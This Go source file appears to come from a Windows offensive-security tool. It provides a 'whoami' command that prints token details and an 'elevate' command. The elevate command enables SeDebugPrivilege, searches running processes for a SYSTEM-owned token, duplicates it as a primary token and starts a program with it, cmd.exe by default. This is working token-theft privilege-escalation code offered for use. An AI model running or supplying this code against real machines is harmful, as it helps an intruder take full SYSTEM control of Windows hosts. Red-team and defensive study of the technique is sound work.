package token

import (
	"fmt"

	"github.com/spf13/cobra"
	"golang.org/x/sys/windows"

	"github.com/vincd/savoir/windows/ntdll"
	"github.com/vincd/savoir/windows/winnt"
)

func displayTokenInformation(token winnt.Token) error {
	tokenStatistics, err := token.GetTokenStatistics()
	if err != nil {
		return err
	}

	fmt.Printf("{%x;%08x}\n", tokenStatistics.AuthenticationId.HighPart, tokenStatistics.AuthenticationId.LowPart)

	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return err
	}

	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return err
	}
	fmt.Printf("User: %s\\%s (%s) (%02dg,%02dp) %s\n", domain, account, tokenUser.User.Sid.String(), tokenStatistics.GroupCount, tokenStatistics.PrivilegeCount, tokenStatistics.TokenType.String())

	if tokenStatistics.TokenType == winnt.TokenImpersonation {
		fmt.Printf(" (%s)\n", tokenStatistics.ImpersonationLevel.String())
	}

	tokenGroupsAndPrivileges, err := token.GetTokenGroupsAndPrivileges()
	if err != nil {
		return err
	}

	// The first one is the current user
	for _, sid := range tokenGroupsAndPrivileges.AllSids()[1:] {
		fmt.Printf("   Group: %s\n", sid.String())
	}

	for _, sid := range tokenGroupsAndPrivileges.AllRestrictedSids() {
		fmt.Printf("    Rest: %s\n", sid.String())
	}

	for _, priv := range tokenGroupsAndPrivileges.AllPrivileges() {
		fmt.Printf("    Priv: %s\n", priv.String())
	}

	return nil
}

func tokenWhoami() error {
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("Cannot get current process handle: (%d)", err, err)
	}

	var token windows.Token
	fmt.Printf("Process Token: \n")
	if err := windows.OpenProcessToken(currentProcess, windows.TOKEN_QUERY, &token); err != nil {
		return fmt.Errorf("Cannot open process token: (%d)", err, err)
	}
	if err := displayTokenInformation(winnt.Token(token)); err != nil {
		return err
	}
	token.Close()

	currentThread, err := windows.GetCurrentThread()
	if err != nil {
		return fmt.Errorf("Cannot get current thread handle: (%d)", err, err)
	}

	fmt.Printf("Thread Token: \n")
	err = windows.OpenThreadToken(currentThread, windows.TOKEN_QUERY, true, &token)
	if err != nil {
		if err != windows.ERROR_NO_TOKEN {
			return fmt.Errorf("Cannot open thread token: %s (%d)", err, err)
		}

		fmt.Printf("no token\n")
		return nil
	}
	if err := displayTokenInformation(winnt.Token(token)); err != nil {
		return err
	}
	token.Close()

	return nil
}

func tokenElevate(commandLine string) error {
	if err := ntdll.AskPrivilege(ntdll.SE_DEBUG); err != nil {
		return err
	}

	sid, err := windows.CreateWellKnownSid(windows.WinLocalSystemSid)
	if err != nil {
		return err
	}
	targetSid := sid.String()

	infos, err := ntdll.QuerySystemProcessInformation()
	if err != nil {
		return err
	}

	currentProcessHandle, err := windows.GetCurrentProcess()
	if err != nil {
		return err
	}
	defer windows.CloseHandle(currentProcessHandle)

	currentProcessId := windows.GetCurrentProcessId()

	for _, processInfo := range infos {
		ptid := uint32(processInfo.UniqueProcessID)

		if ptid == 0 || currentProcessId == ptid {
			continue
		}

		processHandle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, ptid)
		if err != nil {
			continue
		}
		defer windows.CloseHandle(processHandle)

		var tokenHandle windows.Token
		if err := windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &tokenHandle); err != nil {
			continue
		}
		defer tokenHandle.Close()

		var duplicatedTokenHandle windows.Handle
		if err := windows.DuplicateHandle(currentProcessHandle, windows.Handle(tokenHandle), currentProcessHandle, &duplicatedTokenHandle, 0, false, windows.DUPLICATE_SAME_ACCESS); err != nil {
			return err
		}
		defer windows.CloseHandle(duplicatedTokenHandle)

		tokenUser, err := winnt.Token(duplicatedTokenHandle).GetTokenUser()
		if err != nil {
			continue
		}

		if tokenUser.User.Sid.String() != targetSid {
			continue
		}

		var newDuplicatedToken windows.Token
		if err := windows.DuplicateTokenEx(windows.Token(duplicatedTokenHandle), windows.TOKEN_QUERY|windows.TOKEN_IMPERSONATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_DUPLICATE|windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID, nil, windows.SecurityAnonymous, windows.TokenPrimary, &newDuplicatedToken); err != nil {
			return err
		}
		defer newDuplicatedToken.Close()

		// if err := windows.SetThreadToken(nil, newDuplicatedToken); err != nil {
		// 		continue
		// }

		winnt.CreateProcessWithToken(newDuplicatedToken, commandLine)
		break
	}

	return nil
}

func addElevateCommand(cmd *cobra.Command) {
	var exec string

	var elevateCmd = &cobra.Command{
		Use:   "elevate",
		Short: "Create new process with an elevated token",
		Long:  `Search a token for the welk known NT AUTHORITY\Systeme, duplicate it then execute a a command.`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			return tokenElevate(exec)
		},
	}

	elevateCmd.Flags().StringVarP(&exec, "exec", "x", "C:\\Windows\\System32\\cmd.exe", "Command to execute")

	cmd.AddCommand(elevateCmd)
}

func addWhoamiCommand(cmd *cobra.Command) {
	var whoamiCmd = &cobra.Command{
		Use:   "whoami",
		Short: "Display current user informations",
		Long:  `Display current user informations`,
		Args: func(cmd *cobra.Command, args []string) error {
			return nil
		},
		RunE: func(cmd *cobra.Command, args []string) error {
			return tokenWhoami()
		},
	}

	cmd.AddCommand(whoamiCmd)
}

func init() {
	addWhoamiCommand(Command)
	addElevateCommand(Command)
}
